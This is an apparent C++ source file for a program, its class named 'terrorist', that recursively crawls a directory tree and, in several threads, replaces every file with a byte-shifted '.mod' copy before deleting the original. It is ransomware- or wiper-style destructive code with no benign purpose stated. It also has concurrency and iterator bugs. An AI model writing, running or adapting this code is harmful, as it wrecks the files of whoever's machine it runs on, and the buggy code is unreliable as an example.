#include <unistd.h>
#include "terrorist.h"

std::vector<std::string> terrorist::get_all_paths(std::string &root_path){
    std::vector<std::string> paths;
    for (auto &i : std::filesystem::directory_iterator(root_path)){
        paths.push_back(i.path().string());
    }
    return paths;
}

void terrorist::dir_work(std::string root_dir) {
    std::vector<std::string> files_and_dirs = get_all_paths(root_dir);
    for(auto &i : files_and_dirs) {
        if (std::filesystem::is_directory(i)) {
            dir_work(i);
        } else {
            if (!i.ends_with(".mod"))
                if (std::find(victims.begin(), victims.end(), i) == victims.end() &&
                    std::find(current_terrorism.begin(), current_terrorism.end(), i) == current_terrorism.end()) {
                    victims.push_back(i);
                }
        }
    }
}


terrorist::terrorist(std::string main_victim) {
    if(self_pointer == nullptr){
        self_pointer = this;
    }else{
        throw std::runtime_error("This terrorist already exists");
    }
    this->main_path = main_victim;
    execution();
}

void terrorist::execution() {
    std::signal(1, terrorist::signal_handler);
    std::signal(2, terrorist::signal_handler);
    std::signal(15, terrorist::signal_handler);
    std::thread find_new_files_dirs([this](){
        while(!signal){
            dir_work(this->main_path);
        }
    });
    std::vector<std::thread> threads;
    int number = std::thread::hardware_concurrency() - 1;
    threads.resize(number);
    for(auto &i : threads){
        i = std::thread(&terrorist::load_list, this);
    }
    for(auto &i : threads){
        i.join();
    }
    find_new_files_dirs.join();
}

auto terrorist::get_iterator(const std::list<std::string> &list, const std::string &copy) {
    auto iterator = list.begin();
    while(true){
        std::advance(iterator, 1);
        if(*iterator == copy){
            return iterator;
        }
    }
}

void terrorist::load_list(){
    while(!victims.empty() || !signal) {
        std::string copy;
        if (!victims.empty()) {
            {
                std::lock_guard<std::mutex> lg(lock);
                copy = victims.front();
                current_terrorism.push_back(copy);
                victims.pop_front();
            }
                terror(copy);
                current_terrorism.erase(get_iterator(current_terrorism, copy));

        }
    }
}

void terrorist::terror(std::string &victim_path) {
    if(!std::filesystem::exists(victim_path)){
        return;
    }
    std::ifstream file_start(victim_path, std::ios::binary);
     std::uintmax_t size =  std::filesystem::file_size(victim_path);
     std::vector<uint8_t> data(size);
     file_start.read(reinterpret_cast<char*>(data.data()), size);
     std::transform(data.begin(), data.end(), data.begin(), [](uint8_t byte){
         return ++byte;
     });
     sleep(1);
     std::ofstream file_end(victim_path + ".mod", std::ios::binary);
     file_end.write(reinterpret_cast<char*>(data.data()), data.size());
     std::remove(victim_path.c_str());
}

void terrorist::signal_handler(int signum) {
    switch(signum){
        case 1:
            signal = true;
            break;

        case 2:
            signal = true;
            break;

        case 15:
            signal = true;
            break;

    }
}

terrorist *terrorist::get_self() {
    if(self_pointer == nullptr){
        self_pointer = new terrorist();
    }
    return self_pointer;
}

terrorist::terrorist() {
    if(self_pointer == nullptr){
    self_pointer = this;
    } else{
        throw std::runtime_error("This terrorist already exists");
    }
}


